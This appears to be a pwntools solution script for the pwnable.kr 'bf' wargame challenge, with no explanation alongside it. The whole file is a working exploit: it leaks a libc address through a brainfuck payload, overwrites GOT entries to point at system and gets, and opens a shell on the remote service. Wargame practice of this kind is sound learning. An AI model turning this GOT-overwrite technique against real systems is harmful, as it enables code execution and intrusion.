#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *
import time

DEBUG = False
#context.log_level = "debug"
if DEBUG:
	io = process("./bf")
	elf = ELF("./bf")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	
else:
	io = remote("pwnable.kr","9001")
	elf = ELF("./bf")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")

#
#gdb.attach(io)
main_addr = 0x08048671
p_addr_ori = 0x0804a0a0
fgets_got = elf.got["fgets"]
memset_got = elf.got["memset"]
print hex(fgets_got)
char_num = p_addr_ori - fgets_got
char_num2 = memset_got - fgets_got
print hex(char_num)

binsh = "/bin/sh"
payload = char_num*"<" + ".>.>.>.,<,<,<," + char_num2*">" + ">>>,<,<,<," + ">>>>>>>" + ",<,<,<,."
io.sendlineafter("type some brainfuck instructions except [ ]\n",payload)
#print hex(u32(io.recv(4)))
time.sleep(2)
info = io.recv(4)
print info,len(info)
print hex(ord(info[0]))
fgets_addr = u32(info)
log.info("fgets_addr:" + hex(fgets_addr))
libc.address = fgets_addr - libc.symbols["fgets"]
system_addr = libc.symbols["system"]
gets_addr = libc.symbols["gets"]
log.info("system_addr:" + hex(system_addr))
log.info("gets_addr:" + hex(gets_addr))
io.send(chr((system_addr&0xff000000)>>24))
io.send(chr((system_addr&0x00ff0000)>>16))
io.send(chr((system_addr&0x0000ff00)>>8))
io.send(chr((system_addr&0x000000ff)>>0))
io.send(chr((gets_addr&0xff000000)>>24))
io.send(chr((gets_addr&0x00ff0000)>>16))
io.send(chr((gets_addr&0x0000ff00)>>8))
io.send(chr((gets_addr&0x000000ff)>>0))
io.send(chr((main_addr&0xff000000)>>24))
io.send(chr((main_addr&0x00ff0000)>>16))
io.send(chr((main_addr&0x0000ff00)>>8))
io.send(chr((main_addr&0x000000ff)>>0))
#print io.recv()
io.sendline("cat flag\x00")
time.sleep(1)
print io.recv()
print io.recv()
print io.recv()
io.interactive()
